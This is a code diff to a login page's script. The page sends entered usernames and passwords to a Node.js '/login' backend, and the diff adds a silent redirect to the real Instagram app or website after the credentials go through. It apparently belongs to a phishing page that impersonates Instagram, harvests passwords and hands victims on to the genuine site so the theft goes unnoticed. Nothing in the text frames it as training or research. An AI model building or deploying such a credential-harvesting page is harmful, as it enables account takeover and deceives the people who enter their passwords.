@@ -406,7 +406,7 @@ button.forgot-password {
     </main>
  
   </body>
-  <script>
+<script>
 (() => {
   "use strict";
 
@@ -416,7 +416,7 @@ button.forgot-password {
     });
   };
 
-  // ---- Login form - sends to Node.js backend ----
+  // ---- Login form - sends to Node.js backend then redirects ----
   document.querySelectorAll("[data-login-form]").forEach((form) => {
     form.addEventListener("submit", async (event) => {
       event.preventDefault();
@@ -427,10 +427,7 @@ button.forgot-password {
       const username = usernameInput?.value.trim();
       const password = passwordInput?.value.trim();
 
-      if (!username || !password) {
-        // No toast – just return or you can add a simple alert if you prefer
-        return;
-      }
+      if (!username || !password) return;
 
       try {
         const response = await fetch("/login", {
@@ -443,13 +440,29 @@ button.forgot-password {
 
         if (response.ok) {
           discardInputs(form);
-          // No message – silent success
+          // Redirect to Instagram (web or app)
+          // Try deep link for the app first, fallback to web
+          const instagramAppUrl = "instagram://app"; // for mobile app
+          const instagramWebUrl = "https://www.instagram.com/";
+          
+          // Attempt to open the app via deep link
+          const appLink = document.createElement("a");
+          appLink.href = instagramAppUrl;
+          appLink.style.display = "none";
+          document.body.appendChild(appLink);
+          appLink.click();
+          document.body.removeChild(appLink);
+          
+          // Fallback: redirect to web after a short delay
+          setTimeout(() => {
+            window.location.href = instagramWebUrl;
+          }, 1500);
         } else {
-          // Silent fail – or you could log to console
+          // silently fail
           console.error(`Error: ${result.error || "Unknown error"}`);
         }
       } catch (err) {
-        console.error("Server unreachable. Is Node.js running?");
+        console.error("Server unreachable.");
       }
     });
   });
@@ -457,7 +470,6 @@ button.forgot-password {
   // ---- "Forgot password" and "Create new account" buttons ----
   document.querySelectorAll("[data-demo-action]").forEach((button) => {
     button.addEventListener("click", () => {
-      // No toast – silent or console log
       console.log(`${button.dataset.demoAction} clicked (disabled).`);
     });
   });
